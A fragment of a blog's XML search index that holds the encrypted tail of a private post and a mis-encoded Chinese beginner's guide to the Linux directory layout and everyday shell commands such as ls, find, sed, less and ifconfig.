bc55c70543adc47171c231a4d42e480f44deefc80ee950b4e5fd80cf990a10e84e58089dbb74d2612f822f4a9f8b2bfcbe097b656102acfcc013676acfdd94bfbae6a97dbcb002bb92323403b8ec427015bc8fe5f798e704b34646d75f97f6aa95269551d421aa8dfcf60cc5e3f13bfdfff0436d863de14e64fbd83ab57b1d21dc9e86fbb5a73cbb3c7373366a4e687ddf5ff7400cee7f93b84307250b6f4e645225114c45829270b4e3c7e05001dd00f35e70bbeda1e202da79ef1b4fdea3f7d38a6b9ac85b559146274428496ee057352a718e15332318f4e00a9001d16f1f17c5db714058c530b8533ad9b3f776d301dc5c9b29887105e25bce168d08490bfbbaf94cd17f4bd986c9b103e5e91ae2ec3383c8504b6408feee618e52b47141fccc44be85578d6bb7e943f4b9f35d1d585c841fdd4bddbd815ef8f19b7c90f85c32426dd0cd3182cac562d757fd6f68143dc5cfdbe4abea3127401c6f4a10c6c2630646db72551847ac4ae64d5a238bd7c7e55314e6d418c44ddd1561d952122091145877688e8d78a0587f88195ae41534b17289362c125ed05ce2789e028d92b6af52b8ecdde34434de14a4ddd6fc62f80dc06936523bba858adec4b5bcf1b27d7972fdbe042527e6f2b7682372f3e3f00df1fc6613166ea240cb67f18e1f8b5015d599f1744f6416ebc19c308cf200e38c81df8f7b3b0661558cd944a7bb3836f9cfd64037abc6e6374c14f00f1c66f3632fbb132a5aa91cdc0d0f4895073fd10ba7c4d58733f4de61150089a0984906563f1dc5d7d0aee5e5cd1c961cff16e20f7045c3a5da72f2efa05fa67a5699c3e59144817d10f3daaaede36d90b2cbc67a3faa3eede47a29de3613d97b942fb06b98e706e2e09dfc6e6945911531f1a3f7f344682db8972f1f16a98f290f56783341d13d95225f18ecf867ac8c584f3d377b84c14200767f9ef36422f42e62382f534b2bae11b8f04c2532e3b7cdd5b02293ab4c8868b1ac5e25d4ec1f4394c69ad4564ccf68b1cd6a3dc4560284aeeea682eef117bc09b2d53a0134f61080610cf9e39989289f0aa2f5cca916059f25eb8fe7fd2542f24ce8ee60fa9fb0be2783299d2c8576290fba8d61f45819643ad3b5312df66c47187ae32e54772a12db4182d69f6513a81e97fe9e69fee4482ab6cd20846cf46ca69f305695fe6ecc250b4f4f4c010a22d14a34909dbaff7580f4d18b82fd450728145980a783b6316f23d9fc95014755a82bb4f4d80560d895d58e610c2eb02658cb59b5507c6c98cea99d041dd6de613ad222d624731bf71a42782931e18df60e4a42e117f6b8730350503bd22d02ba6a6c4a8b6f8c2947b1b098d1f54b6b5cb79a47bdd3a63af69577dc9d2f89d22bd02cc33d43bd1157dd2362590fb72729f9456b9b0e5c678571fe20f6db81e27b2c094150d94bcefdadffba2ca1f42a369acf3c1af1a92730d96bd9984ad19fe00310f5b89c9b92cddf7b4a86e8c1f532cb3276040e0addc407ebaf75881f71026877cb012a3ebc09439395c778062332684d6b571241ddfdf11cdcbca5bfb7592d32cb5017cce0e6e60c1ae7108f7190a45095fccc4eef49765fdbc2d4a5c4a88b7868c30ce1b6f67e3e20839ac69126aadd009660cb259bb2280799e8546f044ac93739b17de3dc9fd70dc37fdeb9dc635ad001d8b43fe7f6a8e44a8101563301e9582ddd4021ce91f28d38e718b8e73bc4d12ecfd292294a37bb1a28dea585d621f3ecde963013677f03a0eb5e3654e894d06add2b6ae5f76fdb54d7df6b5f5bf648d53830af38291e6f43704cc47b76884e425b4a3e1cec180ae69de850cb39d5602e00dbe21825e8ed7d865cdd851c7db4a92b216947b41eabddc96c9899c9e822e8942bb71a5e7445900f7c905a22dd0e8106a7093b4397e71c1d7cc8dd7aa2878a82671301497e0ff67f1c2d135208489062a595740f512182421511904bdaa3a2a209823c71e5e30e7acfae0af9b90df35fcdde1ac725c2ad37095beea56471377d37374dfd9a8cd939e5339b4f1c5ae3aa14889610b4be9244d6c8c6c3302ab15c6900fe38ce0a9adb4f7445cb4b7a13c252bdbc60fa3e5ed6bc5072807c2f077125935f71442cfae81b1115f0b49c1d84163d0187aa6f7d87f35852beb6281ecced2af24ab99242242a8423f76d660665c83afff0f02f4ba4d768ce82d6c9a66499c512b4007b46446c1a4915b4115c524f0d1260fbbfcfc6d681f7cc77efd31b1ac6d2e383b09a2c350e695354d86a703cd483d4a92de83df05465c279ad73ac9049012a64fff3c64c4df48590c87d640ce05e2cc87d484b71489a4070c3ecac9e8da12d29673d62cdee852b0f248d6241bdbdbd1dfdd0de752b574ca4d03db9352b67b344fdd122d728f0e2fc4044958a136d25040a075f88c25c1d59050d9f7aa77fbf74e92142c2b83500b9792182039af8d984b46dc954a82cf34ee8f4370cfadcaa38bafd97712080948862b19ff03f6642fe0a624fc3599dfb053abbe71f349af167797e7f25f44a2230c20221b0e4d2042dbed18188df510fe07cb7d5da68575bc1f8e287b953bef7753815881f6c0a2eac88e75abc098ce46e609076fd77f0f1dbf7f2daee7ad4bd3610728527bff104f3bfb02b268f214b943e43be311b4e2b380697a7609fc9436bd39f2cd7ea458d3359ceace9ec16ffb170f1957ef3471fa2683e2b47a4e2cd2edd2467c3c0ca76161d39240b18b60f9023101b3922b1f2aefb85e28f8e8081aee1b694f63e91a5f93317e63420a1ac8ee5c338dcd8cd83b3811a724643136b50c7c63291b837cac93e6ac7d7ee68f5c8ce028824ced882d3bc88dfe03d3d22dd2f3421d8615b42650b9737e80bacbbcb918672fa557c884d1fd702cf6c0da9c0fb8b8340f6889874db1413148af98e83e9e5d3c1b98a307fb6e7e783dc3f8f33561e1578062b59dfe95f5959a26506b9f5f9c6a98f19e22e2e6c51502c1af0d91ab877cc1fe757f075ef59a78c081adccafc68c88ac31442007d64e0cc7337329cfc3e9ebfff046a86a2e9fccbf6f57fe048bc49d5756c3b9b15802f52232c8db6ca9e60f7b640b16d1abad803c48470fd82964583f787c7e14a89a777e959e86b3339b2e31c837d16bd9bf58a0171ad7df8ffd75ae046f9c19d0d3032ea8055998a187301cf6f937079340dff369d86f7f81b76709743c51395159c2db161ddc4b623e6f9705c87f5280195d4c86f7bd17a26bb3644d5c437c04dd7f9774449178f590be667ad9ecb02883acaf3a6c7c288855529951a22f71bfccac53205f472172e7d7a915d36ead5afbace60780f466c20cb6fc4c1ee5194193e4011ea2c08468ce124456f7a639fb276818508c7782e25840e9d34f27c9b7a65e1fa569064f043683b1bacda4e4b71acb33601471522a0f6d7f4680651294de9e60ae68836115878c95c3a8da7ed96be4251facea0af1dfd16a2cbebae39ee92760a6af9431876e7c8fc41344ee4157b74dd86f2fbe5c8262708f070fd03f23bb2d8d7427832f5ba2d555a136b0d00eec3631a518a1186c86ecc34a2cc983f0c1b1e58795c3c8ce49e79937965935d26b7cf308657ebb3df301c7498a503f256bb35a15edcb3873a6d1fa81b0e250e9448a6ca92b5b8c7cce3d0de815d54e40678f7d2330261aea0cac4354ce74df948ceae9ba237e32107e555a01f6f63f4f896be143faf13fb055527f599d049d0804075c2051be8d7ff59a0541cd6a0bfdcc52bb162f3d8f0e588a0f8f82bc72ecc1857b9958b1c96d077ff4eb2a2f10f92542f05725b66b7a13265e445d685421e07631053cf82e8d5c703df7c69f54d255dbe15167d3315c4c14f6f837bce91f01d4687dff9fa63ea9226450e876617907090a1d92691a8738451701263fed48ca7753dc32a3345d1a2dbe39cd85f6ce7d2f9c93eaad37f65b2d61336384e2d0df16a4bd920f6a39d2ffc9332d4ebb395f11746e48098deb0b0284b700b394d6690663bcaf75a9477618ca398d526495d61fd2c3ef35836368b8847e1634130b389553b71b8ab3c07f9f83a48116635e0ebf4ee1353d85021a3fdcddf6606ef7ed48282cee4f043589a790b1066075cf9281a9b5728967fc50435d7a7b7c7a4d53139a611e8e187a13051a8cea4919d9b4f53e0f9888aedc5b818ab440439b96d6c984221525608633314a91d89aff4927a0156772b5e663d4c644f5a74087e8b4945f6191be5e56d5a06fed55387275aab06901e6a8507ff5ae086094ca4b6edcd47c7636cf9503aa19ceacb9eee0c9b83fcf511c706e6b6871dc0188cf41d4c19b419c6574286452b80cd46fc2463cda41d986758b54ed382b925bf0aa463d2e129ea6270fe42bd74a95a43ae16a691bf13f7995a9b7ead4fddbfe1d269395925acb3ae156b6857044950c38634b6201657897d714b9ff4169ee182ea74dd3e20df6f99306908d4b5d2c6256b290f0a1a4adb8432e22c9cb6936111252f46fbd220dd99370a2d37a5d7b3890672a1bd6a2200c83b98686d63c24efbffcb16df66eeb049103b67cb3a961c67539f5ab83c7154f63b5cbb0c5ca6d3b6680948e7b23dd18dd6fedad4cdaf593f58ae207d00f31fc749fbeb8fac945635e8d8b097addb1468233da80144b8ab7e3305e994e44d26d76d26c88567d40d83a4a4e95b7ee75227458858fe1376e5222bb1f6e9972a8a1d5043385c7e6352bd91f4cba3b9f0c964bd44055d39f60188a2dc323bfa1c62ee4ffa7f43b22a371d0b3a2de1720be0e2dcf393730f0dcf15a667ee2bf4d9f192e12b29f6a6114782fbaf44f5f3c07dfb6f25fa8e29d56b4c6d4278432dfa706d688f356510c2eff78f7db4cc2b8caa0590e06aae3920fb78f591e25d8f93e290aa4e7b7c68d3d92abfe4313addfd037610bccff1781fe1eb87f222751a154973dde8160d5bf1e1805777d0cb0ba6f9ead4c74ce68dc2209e73b269dab718e005e1808b9ebeac565076db0ffec868977e859a7c1d13d1665309a8a88fc09336531bb3f3d07779b7733bc0fa787b57f3a96766e9671d68fa2445ab50261daffaea14c7ac7114de65a9939ed5509ff9089e2bac2ac74c91d6d0c5172baeb10ddf130b45de5948378d100936e2d2797374d853068f1f132e2384cfc3b801013386631ab380534c7192d96e3d09497de5b687f0fa55e8536f7e727f034951754e7014619e62b6f2d3f9decd8d6b4e1c943ac3f8484a9503778cb0e5e73aa670cde5d000b005d5e29e30fbf96ab5d896814235ccfb9cfa7728acb4cef6ef38028e6e5556189009430db9b0eb8ef940020c9e34a117fcece6019a862319c5d8cfb70aec500ee5b73f1973472d63ba996000e86cf91f09ce106cab2ea6c838bd8f65167873e6e88247488d8159d2ab739c57969b950c2f19ab6baddf709b17145acda8b204c57e81233c954fb3584518d329632f56f92a5b3a90c61a6097964ce52143936a9cce4af97d7bfae818d9475caee0b8f1ab1362034a24e95c9c1ca12fbd29448b32cf82a8b2cc1b8162c6a1d58eac0269abd6714b76578c2c61a06f1defca7816c6184536cc8bee187b1a0cbe58cd69f0cbc9bca5ee53bcdae11adc1be4af56b79ba9b4aa8edad49eb71d48d9471d986ac3221b9ab5ca0928bb9ebdb8d79c3c06cde57d9a7baa2f7157bb9e8a8522d2e21a18231c8ad3d3b42a15450d4e3f98bcd4690c0d4b0f2357596b8deec933341ece1bd2cb2a50f605d9aae9bb9cf5a01ba520f19c2f6fc802ca6b800f8b73158dff512156bf8531a5ac67fe5e552af35def13357ff3f3ff2604e5798cdd05f45f86f829acba46d7abcf18bb5845e8d70667436eba86b3efcbec7f9043d3a6db5fb055fcb3a534a4c1ab5e7d9276b71a639e30a199ce4fbf051490df5c163a998efab05772f02e5edaad375c8db434dc5c933002a119cb8a3b066b58224c463cd96bc500a28215c8dcebcc16d0dffa019dfb64abc4641c22177ea50d2bd1d772b3012433b93d28fae8aac44ea98bc24d0b8b576d7cdcf2d84b5e859b08b15583c7743a831e286d0c857eb7c34326d3f45e7723db68d09455e2d9d779d5d4883ba9e2b16e15ea48ba9b2d683a20c22698873fdfe693736399a6bf6d7caeb33e5614af941ac813d1897c24ac900b9b4e8414da4345cd0f4ee077eea274048cc30335013abdafdb8442a4fd840af0255b4683ea2f513cfa6698f61546b8f25334f7ada8cd6192ac175a75e88c6838ed1dfaa682e1a0daaeb0a70cd4921fe81f828f5c8607dc6bced67ed7db4c3e3f74b5ad3372ef83b47530a4043cb1a5e124d7c66c29f0446793d8361d3610740fe0f086e5c80c2458ae645bc6fb4e857bd6ad4a25b0d1d1843eeca7756a86a18cc10e9845d919cc09a19595fb86e3bb3fe6dc263dd010e3af4a883ff5c65f0c8c3eb79dfbf483d531bf2e15593af044d1c677a6512672bab8e0fe284dcfe10e633dbbf5a9dfa19caecc49c4b5e0dc5fa0aab59a94fcb1730bd4c429043b3a5ea4f6f2cafe31bbdefa4b7d3926315ed9d558a37668fa202f6506442db5861613e366bcbdb58cdeed04f3f0a06acafc1bb858a349b113bf3b5dbcf17413ffb613541b4cdc11abe8a94916873f9a8457e0330e720a226a329e995f87f461dd71fd343fb24ca248d856af0ec91150a17d8d067feb02f2da000c880fb607da66ba26cc82a548912af1ad3b165a118c9a237803c25af2facbd82987653e85d82a5bb98796edbee53d9d1d895fd42c38cd9fd647f43a442e9317efdcede724796a9ff4757cd3ce4cdfec45c3a3944a0ebf2acf34fc679d4faa8424251b73d412c8ca288e44440eebdbacda54528839ebffb25732030adf3bf586dc0dfdc98f7d0e20428bde20c070a907c75dfd45422126c88c48556d276be018623aaf9c093b7dd3af333496116817e486a846b5188e0a8e9d15e7a4d0046528a40f4608d3a82d56e3b8c4864318769351be895f9ea9f7303c026b52e27005a9da4b3018e2e442095a6e0188701048dab4c9ebbb2d6d84ba2c9614ec898cb96d20efcbbedbcd9ecccd46a1a40831e52ca9a4863c9d9e367972301667075fae150c42f47f4d45f009f92ee4d5f112b535586f2ea8da977eae88c2bcca097784a6e84ad7e0f393ffea7a0fc7ee78c30b55d319e0f8a19b574fc31b295b56913b61019c92cad6d92da7afa384143647ecd16a1b88fd9b4444bf03482ba62ce1746cc09bf100a4103812aacdf2bd7f296d645e158b492d79aec655865ab4e8c474a72c853c464e4bb8ecfcdde3263dfb5d85357c5d6ca8161b11fdccdbde4aa38cd7e0763804e96b207eaf5795b593830929e7feac7cde6da969024ec043274751febfa5ec8fd1570bf298cc6057c49d38a15943639138e04c3f1c681bf491a6804cce681e592342488ee737328e5983b4a35e3498d7f155337a2f66d13c355ec934764c0156d8ad27c46251a7f8ec3f58effd01d42218de49d8ce763a40ea5c41b7c3aba68982e1b4a2769935c4e14fbf71bb99820e1724e1437984c7f6b8640af61e8dd0b2f62da0838165ad55d916751cc966b22fd3e0addfd0e4d9a3733ac80f8d539e95443fd5639f969c44b672d93803df2b00d33aad538add475cfcf4d2b6c3fd3ac70bf66061d14f39166d8b97fe687beb0de3e1d9060fbedc7498acf9c9e8ece2edd0501db9e8bf5eaf64379da14526db53b333c5d9d25f5e69a0fc58ecbb33c93b497718b0360a4b0826e2676c6e3a330f2ae80efd2077408191c815459237220a9bf19c2109c8b18a5470d0f9e46b385b9629b65b32b526aa54b65ebfe4d1adcee4c3b6e214acc3f93658573512f822f05826d3833d04bbb867ff3314b96857cce7977597fa57f7207c83c33040c09580f183b3ee3c0de0d748f29310ec3481379783ff0d356881190baeec2e58348f88d48bb0b01b4e8906466410d551ff775c8f185e807c73224dfbb4221ff7c23d81d56cc304ade396d35ea82ae041853cfff1b2a96dffee133e0cc2433857e1856ef1530efa5b8591049259f18321339a06ab373699d8e919329e385339e40a227859ae54b646f81cf2ff0be62c680c076ad3bb7e40a366a289f69378505cca85c78eb12f55abafedbbb40583bbad6c3b9c7ebd5767a6e59ee358f0454d6461795f9a2e48f3a5806b6fafd2ef11d4549def8ad277bdae21ff97458cc2c5034aa6d16280e0984bbda5caa578ec4a6b0d8ecf4ef4b9589e0acaacbf5cf5ec0726512410bbd2de9a31db5948bc27cda6a81820d3cbb872825f6b5944bcb832d05fa8d279ca79c00aa2cac5632fdebeb65860ffc966083b9f8b267ffce9d342eabd95eb69b1dbe834c652c291facfa3a8f4d295a0d3d931923413680b7cad3c18ccf26e01277dedd7b4d793ba71283875b431ef6ac6c97b50362b1828e04a796ee8e15b3a564fc731424ec5a81d4211e1e2b16785f2e5c7031c9d05395afb28cd7ac51070d3e0b9719ba0d452e0ea09d42860bb8ab336ad40dac0059cd607158ddf4a545ef187bb646bd98c5628c86ce1963390e5591c0f6afec311f14b8c5d43ece6864ee25ad25232a74e65845c61c132743b6266c0cd8c5b0c0da84d010288ec8ee8e9f1a17c16e481838a2acfcf39be60d4be3959dd1aecd2e0b717cbee24b1d8d3242748049c117dc36c58f4b89a9ec0ac6095c9ccc4603c36184a797b4c9f6bba432a8f70a1912fe3231a0efcc73caf681fa2523663c5d39bebaac902c8c0e1bb70895caca6087e955c5be9b24288c64f73dfe417a035b26dba62704cb52deeff5cc23e7d76f2e078055bad89470adaab6700b42fe6657569e93a98488545dcbc3f232b7737852fff400d765dc3055d9a4404f1510c21c2a3305cf0a047deb9bc2c1ac8acbdb978a36efd8a2a204bcd6ceef737a5c5d852a5bafa29c986ff0f144af94d03c1b7932cd66782ade8222cf1d1d7ed435cfbf5841c82a16e4161b44c7cda7d5f979cbdf5f147a97da0786f138bc6d595c45701cf6bbf84bd96599d7de8aacd90a0185e6eca71bc5eccc2079357f51a455e2a435c55ee3e9fe9814045a577830bb104300f00c844281c7b1275ceeb839bc7109a2d7aececeed59b852cb370fb397999d77c126925f6b59cc8ae7e74b698b4729b01012a353cdcf72916ca94fe19b03df7e8df7fb292dca095a6ecfaddfb9d13f2f8c9a2ebfcd4525546d372cfdce2cf99b51c7f31c3a4d784e3d936055d0437fd54392cf3af4545339517c269be728bb7eda111bdb1d2a0c448324d7e47375616470667084cf2fdc021afdb6bee7375070d5c17495f9518805f623c590a27add21ed5c4bb01544cc0ad2a4ee6d4940ade3644c4bfffe19c0dde847306857a19d8456b10dfd33a9ba7b3e60dc1eda6084feb3c5e74d18f07d78d7e88d9ddd68a17899ff9210b52ef0eee51624428c65c3491662a4321ea6b3d66ca006342e73bfc27e4b4304283be3a67c66bb6101cba71cf5da14e3f504db5553f40d8941fe9482e8011c60a04ccffc0e278960905a8956bd103570202cc2a81353ed7a05a756ac02748af8531ea5f65498e50c68bad3d4032a485b634c8bf6e62002cf7287c9921ba0a46f5d4b7c900cb7d4c126b832a91374cbe5ff7f4d718011fd835d211ea683f52de9a7565cee3e4d90c1e6cd08e1c084361b0d2cc1ccdcc11a954ab3bdf52ca4a79a7a07ea6d9b8f2c6de0469061642c75654e42c47d376ddfabbf35191fc1bb4a21416c45d8f66308842db1b8102469e0ba91da8810021ee4c356edea4828bd9d58d8c71a2ec279a523f752eb761041341dd561eddd60a27a416fef482b5fbf5bc34ad90a9bada37e3ab0cb3d4218d994763b7e6ecae1753060520e363a465485905b7f109c4faafeff2cfea2bcff96f6d08054856e56e4a2ce40ac216555cda72301c1db914ae52769df89a37d4e1cef5db1fb1ffe97e481adf7e8be3f19519400a109313a85b1b4db39f7956c9ee7461b70ae178db5a435dec1894b356e75d6b88297578dabdb71bed1b0056888976c33ee910a7ecfdfb67049f8a49c7916c695bd93fa3e9f0d54181434f098be91121d21e2face3c78227f4a89efaf504835a02212c12bfd893df9b4a</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§äººå°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux åŸºåŸºåŸºåŸºåŸºåŸºç¡€</title>
      <link href="/2019/09/12/Linux%20%E5%9F%BA%E5%9F%BA%E5%9F%BA%E5%9F%BA%E5%9F%BA%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/09/12/Linux%20%E5%9F%BA%E5%9F%BA%E5%9F%BA%E5%9F%BA%E5%9F%BA%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-æ–‡ä»¶ç³»ç»Ÿ"><a href="#Linux-æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Linux æ–‡ä»¶ç³»ç»Ÿ"></a>Linux æ–‡ä»¶ç³»ç»Ÿ</h2><p>é€»è¾‘æ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ï¼ˆ/ï¼‰ä½äºæ–‡ä»¶ç³»ç»Ÿç›®å½•æ ‘çš„é¡¶éƒ¨ï¼Œä»¥ä¸‹æ˜¯è¦äº†è§£çš„æœ€é‡è¦çš„å­ç›®å½•ï¼š </span><br><span class="line"><span class="string">/root</span> root ç”¨æˆ·çš„ä¸»ç›®å½• </span><br><span class="line"><span class="string">/etc</span> é€šå¸¸åŒ…å« Linux é…ç½®æ–‡ä»¶ - æ§åˆ¶ç¨‹åºå¯åŠ¨æ—¶é—´å’Œæ–¹å¼çš„æ–‡ä»¶ </span><br><span class="line"><span class="string">/home</span> ç”¨æˆ·çš„ä¸»ç›®å½• </span><br><span class="line"><span class="string">/mnt</span> å°†å…¶ä»–æ–‡ä»¶ç³»ç»Ÿé™„åŠ æˆ–å®‰è£…åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ä½ç½® </span><br><span class="line"><span class="string">/media</span> CD å’Œ USB è®¾å¤‡é€šå¸¸è¿æ¥æˆ–å®‰è£…åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ä½ç½® </span><br><span class="line"><span class="string">/bin</span> å…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆç›¸å½“äº Microsoft Windows ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ </span><br><span class="line"><span class="string">/lib</span> lib åº“æ–‡ä»¶ï¼ˆä¸ Windows DLL ç±»ä¼¼çš„å…±äº«ç¨‹åºï¼‰</span><br></pre></td></tr></table></figure><h2 id="LinuxåŸºæœ¬å‘½ä»¤"><a href="#LinuxåŸºæœ¬å‘½ä»¤" class="headerlink" title="LinuxåŸºæœ¬å‘½ä»¤"></a>LinuxåŸºæœ¬å‘½ä»¤</h2><p>pwd    æŸ¥çœ‹å½“å‰ç›®å½•</p><p>whoami    æŸ¥çœ‹ç™»å½•ç”¨æˆ·</p><p>cd    æ›´æ”¹ç›®å½•</p><p>ls    åˆ—å‡ºç›®å½•å†…å®¹</p><p>ls -l    åˆ—å‡ºç›®å½•è¾“å‡ºä¸ºé•¿åˆ—è¡¨</p><p>ls -aï¼ˆls -laï¼‰åˆ—å‡ºå†…å®¹åŒ…æ‹¬éšè—æ–‡ä»¶ã€</p><p>sth - help    è·å–å¸®åŠ©</p><p>man sth    ä½¿ç”¨manå¼•ç”¨æ‰‹å†Œé¡µ</p><h3 id="æœç´¢æŸ¥æ‰¾"><a href="#æœç´¢æŸ¥æ‰¾" class="headerlink" title="æœç´¢æŸ¥æ‰¾"></a>æœç´¢æŸ¥æ‰¾</h3><p>locate sth    æ­¤å‘½ä»¤å°†éå†æ•´ä¸ª æ–‡ä»¶ç³»ç»Ÿå¹¶æ‰¾åˆ°è¯¥å•è¯çš„æ¯ä¸ªåŒ¹é…é¡¹ã€‚ </p><p>whereis sth    æ­¤å‘½ä»¤ä¸ä»…è¿”å›äºŒè¿›åˆ¶æ–‡ä»¶çš„ä½ç½®ï¼Œè¿˜è¿” å›å…¶æºå’Œæ‰‹å†Œé¡µï¼ˆå¦‚æœå¯ç”¨ï¼‰ã€‚</p><p>which sth    åœ¨PATHå˜é‡ä¸­æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶</p><p>findï¼š</p><p>â€‹        è¯­æ³•ï¼šfind directory options expression </p><p>â€‹        ä¾‹ï¼šfind / -type f -name apache2.*            (fè¡¨ç¤ºæ™®é€šæ–‡ä»¶)</p><p>ps aux    æä¾›äº†åœ¨è¿™ä¸ªç³»ç»Ÿä¸­è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹çš„åˆ—è¡¨ </p><p>grep è¿‡æ»¤å…³é”®å­—ï¼ˆé…åˆç®¡é“ç¬¦ï¼‰</p><p>cat    æ˜¾ç¤ºæ–‡ä»¶</p><p>cat &gt;    åˆ›å»ºå°æ–‡ä»¶ï¼ˆCTRL-Dä¿å­˜ï¼‰</p><p>cat &gt;&gt;    é™„åŠ </p><p>touch filename    åˆ›å»ºåä¸ºfilenameçš„æ–‡ä»¶</p><p>mkdir \dirname    åˆ›å»ºç›®å½•</p><p>cp oldfilename path/newfilename    å¤åˆ¶æ–‡ä»¶</p><p>mv oldfile newfile    è¿‚å›é‡å‘½åæ–‡ä»¶</p><p>rm filename    åˆ é™¤æ–‡ä»¶</p><p>rmdir dirname    åˆ é™¤ç©ºç›®å½•</p><p>rm -r dirname    åˆ é™¤ç›®å½•åŠæ–‡ä»¶</p><p>head filename    æŸ¥çœ‹å¼€å¤´å‰ï¼ˆé»˜è®¤ï¼‰åè¡Œ</p><p>head -20 filename    æŸ¥çœ‹å¼€å¤´å‰20è¡Œ</p><p>tail filename    åŒheadï¼ŒæŸ¥çœ‹æ–‡ä»¶å°¾</p><p>nl filename    æ˜¾ç¤ºè¡Œå·</p><p>ä¾‹ï¼štail  -n+507  /etc/snort/snort.conf  |  head  -n  6</p><p>sed  æŸ¥æ‰¾å’Œæ›¿æ¢</p><p>ä¾‹ï¼šsed    s/mysql/MySQL/g  /etc/snort/snort.conf  &gt;  snort2.conf</p><p>s å‚æ•°æä¾›æœç´¢ï¼Œä½ å…ˆæä¾›æƒ³è¦æœç´¢çš„å…³é”®è¯ (mysql) ç„¶åæä¾›æƒ³è¦æ›¿æ¢æˆçš„å…³é”®è¯ (MySQL), ç”¨æ–œæ  (/)åˆ†å¼€ã€‚g å‚æ•°å‘Šè¯‰ Linux ä½ å¸Œæœ›å…¨å±€æ›¿æ¢ï¼Œç„¶åå°†ç»“æœä¿å­˜åˆ°ä¸€ä¸ªæ–°æ–‡ä»¶ snort2.confã€‚ </p><p>å¦‚æœä½ åªæƒ³æ›¿æ¢ç¬¬ä¸€ä¸ªå‡ºç°çš„ mysqlï¼Œä½ éœ€è¦å»æ‰æœ«å°¾çš„ g å‚æ•°ã€‚ </p><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ sed å‘½ä»¤æŸ¥æ‰¾æ›¿æ¢ç¬¬ä¸€ä¸ªå‡ºç°å­—æ®µä»¥å¤–çš„ä»»æ„ä½ç½®å‡ºç°çš„å­—æ®µã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³åªæ›¿æ¢ ç¬¬äºŒä¸ªå‡ºç°çš„ mysqlï¼Œ</p><p>sed  s/mysql/MySQL/2  snort.conf  &gt;  snort2.conf </p><p>more filename    æ§åˆ¶æ˜¾ç¤ºæ–‡ä»¶    enteré”®æ¢è¡Œ</p><p>less filename    æŒ‰ä¸‹æ–œæ é”®ï¼ˆ/ï¼‰ï¼Œ è¾“å…¥ï¼ˆoutputï¼‰ï¼Œè¿™ä¼šç«‹å³å°†ä½ å¸¦åˆ°ç¬¬ä¸€ä¸ªå‡ºç° output çš„åœ°æ–¹ï¼Œå¹¶ä¸”é«˜äº®äº† outputã€‚ç„¶åä½ å¯ä»¥æŒ‰ n é”®ï¼ˆnextï¼‰åˆ°ä¸‹ä¸€ ä¸ªå‡ºç° ï¼ˆoutput ï¼‰çš„åœ°æ–¹ã€‚ </p><h2 id="åˆ†æå’Œç®¡ç†ç½‘ç»œ"><a href="#åˆ†æå’Œç®¡ç†ç½‘ç»œ" class="headerlink" title="åˆ†æå’Œç®¡ç†ç½‘ç»œ"></a>åˆ†æå’Œç®¡ç†ç½‘ç»œ</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>eth0ï¼ˆEthernet0ï¼‰ç¬¬ä¸€ä¸ªæœ‰çº¿ä»¥å¤ªç½‘æ¥å£</p><p>Ethernet     ä»¥å¤ªç½‘</p><p>HWaddr    æ¯ä¸ªç½‘ç»œç¡¬ä»¶ä¸Šæ ‡è®°çš„å…¨å±€å”¯ä¸€æ ‡è®°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç½‘ç»œæ¥å£å¡ network interface card (NIC), é€šå¸¸æŒ‡çš„æ˜¯åª’ä½“è®¿é—®æ§åˆ¶ media access control (MAC) åœ°å€ã€‚ </p><p>inet addr    åˆ†é…IPåœ°å€ä¿¡æ¯çš„ç½‘ç»œæ¥å£     </p><p>Bcast    å¹¿æ’­åœ°å€ï¼Œç”¨äºå‘å­ç½‘ä¸Šçš„æ‰€æœ‰ IP å‘é€ä¿¡æ¯çš„åœ°å€;</p><p>Mask    å­ç½‘æ©ç ï¼Œç”¨äºç¡®å®š IP åœ° å€çš„å“ªä¸ªéƒ¨åˆ†è¿æ¥åˆ°æœ¬åœ°ç½‘ç»œ</p><p>lo     ç¯å›åœ°å€ï¼ˆloopback addressï¼‰    å¹¶ä¸”æœ‰æ—¶ç§°ä¸º localhost    è¿™æ˜¯ä¸ªç‰¹æ®Šçš„è½¯ä»¶åœ°å€ï¼Œå¯å¸®åŠ©ä½ è¿æ¥åˆ°è‡ªå·±çš„ç³»ç»Ÿã€‚æœªåœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„è½¯ä»¶å’ŒæœåŠ¡å°† æ— æ³•è¢«ä½¿ç”¨ã€‚ä½ å¯ä»¥ä½¿ç”¨ lo åœ¨ä½ çš„ç³»ç»Ÿæµ‹è¯•æŸäº›å†…å®¹ï¼Œä¾‹å¦‚ä½ è‡ªå·±çš„ web æœåŠ¡å™¨ã€‚æœ¬åœ°ä¸»æœºé€šå¸¸ç”¨ IP åœ° å€ 127.0.0.1 è¡¨ç¤ºã€‚ </p><p>wlan0    åªæœ‰å½“æ‹¥æœ‰æ— çº¿æ¥å£æˆ–é€‚é…å™¨æ—¶ï¼Œæ‰ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚è¯·æ³¨æ„ï¼Œå®ƒè¿˜ ä¼šæ˜¾ç¤ºè¯¥è®¾å¤‡ (HWaddr)çš„ MAC åœ°å€ã€‚ 